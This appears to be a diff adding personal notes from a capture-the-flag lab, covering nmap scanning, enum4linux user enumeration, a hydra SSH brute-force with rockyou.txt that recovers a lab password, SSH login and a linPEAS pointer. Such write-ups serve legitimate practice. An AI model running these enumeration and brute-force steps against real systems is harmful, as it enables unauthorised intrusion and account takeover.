@@ -1,0 +1,26 @@
+Room IP: 10.10.69.33
+
+Scanning:
+PING: OK
+
+nmap -sC -sV -oN nmap/initial 10.10.69.33
+ports:
+22: ssh
+80: web
+139: Samba
+445: Samba
+8009: Apache Jserv
+8080: web
+
+Dirbuster found /development:
+2 files dev.txt and j.txt
+
+enum4linux -a 10.10.69.33 | tee enum4linux.log:
+found kay and jan
+
+hydra -l jan -P rockyou.txt ssh://10.10.69.33
+found: armando
+
+ssh jan@10.10.69.33
+ls home -> cd to kay -> ls
+I could just vi the pass.bak but they want you to use https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
